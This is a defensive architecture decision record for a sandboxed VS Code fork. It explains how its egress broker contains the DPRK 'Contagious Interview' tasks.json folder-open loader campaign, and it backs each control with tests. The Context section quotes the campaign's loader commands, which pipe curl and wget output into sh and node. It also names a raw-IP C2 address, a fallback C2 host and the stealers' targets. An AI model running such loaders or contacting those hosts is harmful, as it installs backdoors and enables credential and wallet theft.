# Defeat folder-open loaders and beacons (tasks.json abuse, DPRK "Contagious Interview")

- **Status:** accepted
- **Date:** 2026-11-04
- **Deciders:** anticomputer (user). Verbatim: "research https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/ and make sure our threat model specifically protects against that" and "tasks.json abuse essentially". Coordinator (requirements); broker session (design and implementation).
- **Related:** [ADR tab is the containment unit](20261104-tab-is-the-containment-unit.md), [ADR no real secret enters a tab](20261104-no-real-secret-enters-a-tab.md), [ADR policy and protocol](20261104-broker-policy-and-control-protocol.md), [security review](../security-reviews/20261104-broker-folder-open-loaders.md)

## Context
The campaign works like this, according to
[Jamf Threat Labs (2026-01-20)](https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/)
and [OpenSourceMalware (2025-11-29)](https://opensourcemalware.com/blog/latest-contagious-interview-malware-campaign-abuses-microsoft-vscode-tasks),
both read on 2026-11-04.

1. **Lure.** A fake recruiter asks a developer to clone and "review" a
   repository.
2. **Trust.** When the folder is opened, VS Code asks the user to trust it.
   The user agrees.
3. **Loader.** `.vscode/tasks.json` has a task with `runOptions.runOn:
   folderOpen` and hidden presentation. Its command is
   `curl 'https://vscode-setup.vercel.app/settings/mac?flag=1' | sh`, or
   `wget -qO- … | sh`, or `nohup bash -c "curl -s … | node"`.
4. **Further stages.** These are downloaded from `*.vercel.app` into
   `~/.vscode`, and `env-setup.js` `eval`s code from
   `ip-api-check-nine.vercel.app`.
5. **Payload.** A backdoor fingerprints the host and looks up its public IP
   via `ipify.org`. It beacons to its C2 **every 5 s** and runs any JavaScript
   it receives.
6. **Stealer.** BeaverTail and Invisible Ferret steal browser credentials,
   wallet extensions, Solana keys and keychain databases. They exfiltrate over
   **cleartext HTTP to a raw IP on port 1224** (`146.70.41.188:1224`), with
   `api.npoint.io` as a fallback C2. <!-- fixture-lint: ignore -->

Workspace Trust is the only barrier in stock VS Code, and the lure persuades
the user to click through it. That is why our design does not treat Workspace
Trust as a boundary
([ADR](20261104-tab-is-the-containment-unit.md)).

## Decision
Each step of the campaign fails, or is contained, on our side **without the
user making a correct decision**.

| Campaign step | What happens in seclab-vscode | Where |
|---|---|---|
| Folder-open task runs `curl … \| sh` | The task runs **inside the tab sandbox**, never on the host. That is contained by construction: tasks, terminals and LSPs all run in the tab. | ARCHITECTURE §4.3, §4.7 |
| `curl https://*.vercel.app/…` loader fetch | Denied **without a prompt**, because `*.vercel.app` is on the maintained risky-destination list and the user has not acted in the tab yet. The pipe to `sh` receives a JSON 403 body, not a script. | broker: `autoDenyRiskyBeforeUserAction`, [risky list](../broker-policy.md#risky-destinations-generated) |
| Even after the user acts | A prompt flags `risky-destination:hosting` and the claimed origin, and offers only *allow once* or *deny*. *Always allow* is never offered for hosting, paste or IP-echo hosts. | broker: per-approval `decisions` |
| `ipify.org` public-IP lookup | Same handling (`ip-echo`). | risky list |
| `api.npoint.io` fallback C2 | Same handling (`paste`). | risky list |
| Raw-IP C2 `http://<ip>:1224` | Denied without a prompt by default, whether or not the user has acted (`rawIpDestinations: deny`). Flagged `raw-ip`, `cleartext` and `nonstandard-port`. | broker |
| 5-second beacon to a new host | **One** prompt. After a deny or timeout, that destination is denied without asking for `denyCooldownSeconds` (300 s). A beacon that rotates destinations hits the per-tab prompt rate limit (`maxPerMinute`, 6). After `offerDenyNewAfter` (3) denials the prompt offers *deny all new destinations for this tab*. | broker |
| Writes to `~/.vscode`, `~/.n2` | The tab's own home directory, inside the sandbox. Nothing on the host changes. | sandbox |
| Steal browser data, wallets, keychain, `~/.config/solana` | None of these exist in the tab: only the workspace is mounted, and there is no host `$HOME`. | sandbox, ARCHITECTURE §4.3 |
| Steal tokens | A tab only ever holds sentinels. They are worthless outside the broker's bindings, and minted tokens are re-sentinelised. | [ADR no real secret](20261104-no-real-secret-enters-a-tab.md) |
| Persistence ("runs every time the folder opens") | Each open re-runs inside a fresh tab, under the same controls. | sandbox |

**New broker behaviour.** Each item has tests, and the capability flags are in
the [matrix](../../broker/README.md#engine-capability-matrix):
- **Maintained risky-destination list.** It lives in
  `broker/seclab_broker/data/risky-destinations.v1.json` and covers hosting,
  paste, raw-content, IP-echo, tunnel and request-capture services.
  - Policies may add entries (`riskyDestinations`).
  - The built-in baseline and the shipped example policies must never match the
    list; docs-check and a unit test enforce this.
  - `raw.githubusercontent.com` was removed from the GitHub example. It is a
    raw-content host, and should only appear as a binding on specific paths.
- **User-action gating.**
  - The trusted control client reports `tab.event opened` and `tab.event
    userAction`. The tab cannot send these.
  - Until the first user action, requests to risky destinations and raw IPs
    are denied without a prompt.
  - Requests within `quietPeriodSeconds` of opening, with no user action, are
    flagged `early-after-open`.
- **Raw-IP destinations** are denied by default. With `prompt-once`, only
  *allow once* or *deny* is offered.
- **Flood control:**
  - per-destination coalescing (already present);
  - deny cooldown default raised from 30 s to 300 s;
  - a per-tab `maxPerMinute` limit on new prompts;
  - the `deny-new-destinations` decision;
  - `prompt.reset` to clear all of the above.
- **Attribution.** Every prompt and egress audit event carries a `risk` object:
  flags, seconds since open, whether a user action has been seen, and
  `origin: {label, verified: false}`.
  - The label comes from the proxy username, `seclab+<label>`. Whatever starts
    a process in the tab sets it (for example `task.env` for the task runner).
  - A process in the tab can claim any label, so it is **advisory, never used
    for a decision**.

## Alternatives considered
- **Real process lineage** (e.g. "task `env` → bash → node") from inside the
  broker: **not possible**. The broker sees TCP connections from the tab, not
  processes.
  - Under sbx, every connection arrives from the VM through Docker Desktop.
  - Under OCI, the tab's PID namespace is separate.
  - Only an observer in the tab's kernel (eBPF in the sbx VM, or a gVisor or
    seccomp-notify hook) could attribute a socket to a process tree. That
    observer would have to sit outside the attacker's control, so it is a
    runtime-provider feature, not a broker feature.

  We ship the unverified label plus the **trusted** timing signal instead. The
  user-action clock is the one the campaign cannot fake. Follow-up for the
  Fork-build session: the REH task runner sets `seclab+task.<label>` in each
  task's proxy URL, and the terminal sets `seclab+terminal`.
- **Block risky categories outright, even after user action:** rejected.
  Developers legitimately use Vercel previews, GitHub raw files and so on. We
  allow-once with a flag, never *always*, and deny before any user action.
- **A threat-intelligence feed of known C2 IPs and domains:** rejected as the
  primary control, because the campaign rotates infrastructure (Jamf watched
  the URL change several times). Category- and behaviour-based controls don't
  depend on knowing the indicator.
- **Disabling `runOn: folderOpen` tasks:** the same tasks.json would just run on
  first build instead. Containment and egress control cover both. Disabling
  folder-open tasks is an orthogonal UX hardening for the Fork-build session to
  decide on.

## Consequences
- **Package registries (npm and similar):** a tab may allow
  `registry.npmjs.org`, and the GitHub example does. A malicious dependency's
  install script then runs **inside the tab**, exactly like the folder-open
  task. It sees only the workspace and sentinels, gets no host file access, no
  real secret and no host network position, and its own egress faces the same
  gating, risky list, raw-IP deny and flood control. Registry access is
  read-only content fetching: it adds no route for exfiltration beyond what the
  registry itself accepts. Publishing needs a credential bound to the publish
  path.
- **Prompt UI requirements for the supervisor:**
  - send `tab.event`;
  - render `risk` (flags and the unverified origin);
  - offer exactly `decisions`.
- **Behaviour change:** the deny cooldown default is now 300 s. A policy that
  wants the old behaviour sets `denyCooldownSeconds: 30`.
- **Raw IPs in disguise:** a hostname that spells an IPv4 address
  (`<ip>.sslip.io`, `ec2-1-2-3-4.…`) is flagged `ip-in-hostname` and treated
  like a raw IP: gated before the first user action, and never offered
  `allow-tab`. Wildcard-DNS services are on the list as `ip-dns`. An approval
  can never add a rule or binding for a raw IP or a risky host, even when the
  client asks; the broker enforces this. These came out of the
  [security review](../security-reviews/20261104-broker-folder-open-loaders.md).
- **Residual risk:**
  - The shipped GitHub example allows `api.github.com GET /**`, which can serve
    raw repository files. Tabs that don't need the API shouldn't allow it.
  - A user who has acted in the tab can still choose *allow once* on a flagged
    risky host, or on an unlisted, attacker-registered domain that resolves to
    a public IP. Even then the payload runs inside the tab, with no host access
    and no real secrets.

## Evidence
- Unit tests in
  [`tests/unit/test_campaign.py`](../../broker/tests/unit/test_campaign.py):
  campaign hosts are classified as risky; the baseline and examples exclude
  them; raw IPs are denied or offered allow-once only; risky destinations are
  never offered allow-tab; risky requests are auto-denied before user action;
  the rate limit works; deny-new-destinations is offered and enforced; the
  origin label is parsed.
- Integration tests in
  [`tests/integration/test_campaign.py`](../../broker/tests/integration/test_campaign.py),
  using test-owned stand-ins on `--internal` networks:
  - **Campaign replay:** the loader, the IP-echo lookup, the paste fallback
    and the raw IP on port 1224 all get 403 with no prompt, and are audited
    with the origin label.
  - **Real 5-second beacon:** five requests produce one prompt.
  - **Rotating beacon:** prompts stop after deny-new-destinations.
- `broker/test.sh` at `564d2e6`: 160 unit and 43 integration tests passed.
